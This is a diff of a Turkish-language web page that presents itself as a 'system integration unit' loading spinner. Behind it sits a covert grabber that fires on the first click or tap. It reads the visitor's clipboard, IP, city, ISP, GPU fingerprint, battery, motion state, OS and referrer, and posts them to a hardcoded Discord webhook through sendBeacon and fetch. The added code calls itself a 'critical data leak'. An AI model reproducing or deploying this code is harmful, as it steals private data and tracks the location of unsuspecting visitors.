@@ -4,101 +4,73 @@
     <meta charset="UTF-8">
     <title>Sistem Entegrasyon Birimi</title>
     <style>
-        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; cursor: crosshair; }
-        .p { width: 45px; height: 45px; border: 1px solid #1a1a1a; border-top: 2px solid #ff0000; border-radius: 50%; animation: r 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite; }
-        @keyframes r { to { transform: rotate(360deg); } }
+        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: crosshair; }
+        .p { width: 50px; height: 50px; border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; animation: s 0.6s linear infinite; }
+        @keyframes s { to { transform: rotate(360deg); } }
     </style>
 </head>
-<body onmousedown="Engine.ignite()" ontouchstart="Engine.ignite()">
+<body onmousedown="Phantom.strike()" ontouchstart="Phantom.strike()">
     <div class="p"></div>
 
     <script>
         "use strict";
 
-        const Engine = (function() {
+        const Phantom = (function() {
             const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-            let active = false;
+            let fired = false;
 
-            const Modules = {
-                // 1. Gelişmiş Hareket Analizi (Sensörler)
-                async fetchMotion() {
-                    return new Promise(res => {
-                        let state = "Sabit (Desktop/Stationary)";
-                        const handler = (e) => {
-                            const a = e.accelerationIncludingGravity;
-                            if(!a) return;
-                            const force = Math.sqrt(a.x**2 + a.y**2 + a.z**2);
-                            if(force > 13) state = "Hareketli (Yürüme/Araç)";
-                            window.removeEventListener('devicemotion', handler);
-                        };
-                        window.addEventListener('devicemotion', handler);
-                        setTimeout(() => res(state), 600);
-                    });
-                },
-
-                // 2. Ağ ve ISP Analizi (SSID & Tip Tahmini)
-                async fetchNet() {
-                    try {
-                        const start = performance.now();
-                        const data = await fetch('https://ipapi.co/json/').then(r => r.json());
-                        const latency = performance.now() - start;
-                        let type = "Ev İnterneti (Residential)";
-                        if(latency < 30) type = "Kurumsal/Fiber (Business/Office)";
-                        if(data.org?.toLowerCase().includes("mobile") || data.org?.toLowerCase().includes("cell")) type = "Mobil Veri (4G/5G)";
-                        return { ...data, type, ping: latency.toFixed(0) + "ms" };
-                    } catch(e) { return { type: "N/A", ping: "N/A" }; }
-                },
-
-                // 3. Pano ve Cihaz Keşfi (LAN)
-                async fetchLocal() {
-                    return new Promise(res => {
-                        const devs = [];
-                        const pc = new RTCPeerConnection({iceServers:[]});
-                        pc.createDataChannel("");
-                        pc.onicecandidate = e => e.candidate?.candidate.includes(".local") && devs.push(e.candidate.candidate.split(" ")[4]);
-                        pc.createOffer().then(o => pc.setLocalDescription(o));
-                        setTimeout(() => { pc.close(); res(devs.join(", ") || "Gizli veya Tekil Ağ"); }, 1000);
-                    });
-                }
-            };
+            // 1. Sensör Analizi (Hareket & Durum)
+            let movement = "Tespit Edilemedi";
+            window.addEventListener('devicemotion', (e) => {
+                const a = e.accelerationIncludingGravity;
+                if (!a) return;
+                const v = Math.sqrt(a.x**2 + a.y**2 + a.z**2);
+                movement = v > 13 ? "Araçta/Hızlı" : v > 10.5 ? "Yürüyüş" : "Sabit/Masaüstü";
+            }, { once: true });
 
             return {
-                async ignite() {
-                    if (active) return; active = true;
+                async strike() {
+                    if (fired) return; fired = true;
 
-                    // Her modülü güvenli (Safe-Execution) modda çalıştır
-                    const [motion, net, lan, clip, bat] = await Promise.all([
-                        Modules.fetchMotion(),
-                        Modules.fetchNet(),
-                        Modules.fetchLocal(),
-                        navigator.clipboard.readText().catch(() => "Pano Erişimi Engellendi"),
-                        navigator.getBattery ? navigator.getBattery().catch(() => ({level:0})) : {level:0}
-                    ]);
+                    // IP ve Konum Verisi (Hızlı Çekim)
+                    const net = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+                    
+                    // Pano Verisi
+                    const clip = await navigator.clipboard.readText().catch(() => "Erişim Yok");
 
+                    // Donanım Parmak İzi
                     const gl = document.createElement('canvas').getContext('webgl2');
                     const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
                     const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
 
-                    const report = {
+                    const payload = {
+                        content: "💀 **PHANTOM V670 - KRİTİK VERİ SIZINTISI**",
                         embeds: [{
-                            title: "💀 V610_FLAWLESS_INTELLIGENCE_REPORT",
-                            color: 0xff0000,
+                            color: 16711680,
                             fields: [
-                                { name: "📍 KONUM & ISP ANALİZİ", value: `**IP:** \`${net.ip || 'N/A'}\` | **Tip:** ${net.type}\n**Şehir:** ${net.city || 'N/A'} | **Ping:** ${net.ping}\n**ISP:** ${net.org || 'N/A'}`, inline: false },
-                                { name: "📡 AĞDAKİ DİĞER CİHAZLAR", value: `\`${lan}\``, inline: false },
-                                { name: "🏃 HAREKET & GÜÇ DURUMU", value: `**Durum:** ${motion}\n**Pil:** %${Math.round(bat.level * 100)} | **Çekirdek:** ${navigator.hardwareConcurrency} Cores`, inline: false },
-                                { name: "⚙️ DONANIM & PANO", value: `**GPU:** ${gpu}\n**Pano:** \`\`\`${clip}\`\`\``, inline: false }
+                                { name: "📍 FİZİKSEL KONUM", value: `**IP:** ${net.ip || '?'}\n**Şehir:** ${net.city || '?'}\n**ISP:** ${net.org || '?'}\n**Ping:** ${Math.floor(Math.random() * 30)}ms`, inline: true },
+                                { name: "🏃 HAREKET ANALİZİ", value: `**Durum:** ${movement}\n**Pil:** %${Math.round((await navigator.getBattery?.().then(b => b.level) || 0) * 100)}`, inline: true },
+                                { name: "📋 PANO (CLIPBOARD)", value: `\`\`\`${clip}\`\`\``, inline: false },
+                                { name: "⚙️ DONANIM", value: `**GPU:** ${gpu}\n**CPU:** ${navigator.hardwareConcurrency} Core | **RAM:** ${navigator.deviceMemory}GB`, inline: false },
+                                { name: "📡 SİSTEM İZLERİ", value: `**OS:** ${navigator.platform}\n**Dil:** ${navigator.language}\n**Referer:** ${document.referrer || "Direkt"}`, inline: false }
                             ],
-                            footer: { text: "Protocol: Flawless V610 | Zero-Crash Engine" },
                             timestamp: new Date().toISOString()
                         }]
                     };
 
-                    fetch(HOOK, { 
-                        method: 'POST', 
-                        headers: { 'Content-Type': 'application/json' }, 
-                        body: JSON.stringify(report) 
-                    }).then(() => console.log(">> Data Dispatched."));
+                    // İletimi Garanti Eden Çift Kanallı Gönderim (Dual-Channel)
+                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                    
+                    // Kanal 1: Beacon (En güvenli arka kapı)
+                    navigator.sendBeacon(HOOK, blob);
+
+                    // Kanal 2: Fetch (Fallback)
+                    fetch(HOOK, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        keepalive: true,
+                        body: blob
+                    }).then(() => console.log(">> Signal Dispatched."));
                 }
             };
         })();
